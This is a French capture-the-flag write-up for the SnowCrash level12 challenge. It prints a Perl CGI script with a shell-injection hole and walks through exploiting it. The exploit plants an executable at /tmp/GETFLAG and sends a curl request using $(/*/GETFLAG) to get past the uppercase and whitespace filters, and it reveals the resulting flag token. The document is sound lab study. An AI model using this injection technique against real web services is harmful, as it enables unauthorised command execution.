```bash
level12@SnowCrash:~$ find / -group level12 2>/dev/null | grep -v '/proc'
/var/www/level12
/var/www/level12/level12.pl
/rofs/var/www/level12
/rofs/var/www/level12/level12.pl
level12@SnowCrash:~$ find / -user flag12 2>/dev/null | grep -v '/proc'
/var/www/level12
/var/www/level12/level12.pl
/rofs/var/www/level12
/rofs/var/www/level12/level12.pl
```

```bash
level12@SnowCrash:~$ ll
[...]
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl*
[...]
```

The file `level12.pl`

```pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

- `$xx =~ tr/a-z/A-Z/;` remplace toutes les minuscules de x en majuscule.
- `$xx =~ s/\s.*//;` supprime tout ce qui est whitespace
- `@output = ...` execute la command egrep

Step:
- Lors de l'execution de egrep nous pouvons executer un sous shell avec un injection.
- On a donc besoin d'executer quelque chose ayant aucun whitespace et aucune minuscule dans son path.
- PB: On a acces seulement a /tmp en ecriture.
  - Pour resoudre se probleme nous allons utiliser le wildcard du shell `/*/GETFLAG`

```bash
echo 'getflag > /tmp/flag' > /tmp/GETFLAG
chmod a+x /tmp/GETFLAG
curl 'localhost:4646?x=$(/*/GETFLAG)' &>/dev/null
cat /tmp/flag

level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
